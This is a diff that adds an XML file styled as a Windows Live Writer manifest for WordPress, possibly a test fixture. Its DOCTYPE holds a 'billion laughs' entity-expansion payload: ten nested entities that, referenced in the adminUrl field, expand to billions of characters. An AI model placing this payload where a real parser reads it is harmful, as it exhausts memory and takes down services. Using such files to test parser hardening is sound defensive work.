@@ -1,0 +1,23 @@
+<?xml version="1.0" encoding="utf-8" ?>
+<!DOCTYPE wlwz [
+ <!ENTITY wlw "wlw">
+ <!ENTITY wlw1 "&wlw;&wlw;&wlw;&wlw;&wlw;&wlw;&wlw;&wlw;&wlw;&wlw;">
+ <!ENTITY wlw2 "&wlw1;&wlw1;&wlw1;&wlw1;&wlw1;&wlw1;&wlw1;&wlw1;&wlw1;&wlw1;">
+ <!ENTITY wlw3 "&wlw2;&wlw2;&wlw2;&wlw2;&wlw2;&wlw2;&wlw2;&wlw2;&wlw2;&wlw2;">
+ <!ENTITY wlw4 "&wlw3;&wlw3;&wlw3;&wlw3;&wlw3;&wlw3;&wlw3;&wlw3;&wlw3;&wlw3;">
+ <!ENTITY wlw5 "&wlw4;&wlw4;&wlw4;&wlw4;&wlw4;&wlw4;&wlw4;&wlw4;&wlw4;&wlw4;">
+ <!ENTITY wlw6 "&wlw5;&wlw5;&wlw5;&wlw5;&wlw5;&wlw5;&wlw5;&wlw5;&wlw5;&wlw5;">
+ <!ENTITY wlw7 "&wlw6;&wlw6;&wlw6;&wlw6;&wlw6;&wlw6;&wlw6;&wlw6;&wlw6;&wlw6;">
+ <!ENTITY wlw8 "&wlw7;&wlw7;&wlw7;&wlw7;&wlw7;&wlw7;&wlw7;&wlw7;&wlw7;&wlw7;">
+ <!ENTITY wlw9 "&wlw8;&wlw8;&wlw8;&wlw8;&wlw8;&wlw8;&wlw8;&wlw8;&wlw8;&wlw8;">
+ <!ENTITY wlw10 "&wlw9;&wlw9;&wlw9;&wlw9;&wlw9;&wlw9;&wlw9;&wlw9;&wlw9;&wlw9;">
+]>
+<manifest xmlns="http://schemas.microsoft.com/wlw/manifest/weblog">
+	<options>
+		<clientType>WordPress</clientType>
+	</options>
+  <weblog>
+    <serviceName>WordPress</serviceName>
+    <adminUrl>&wlw10;</adminUrl>
+  </weblog>
+</manifest>
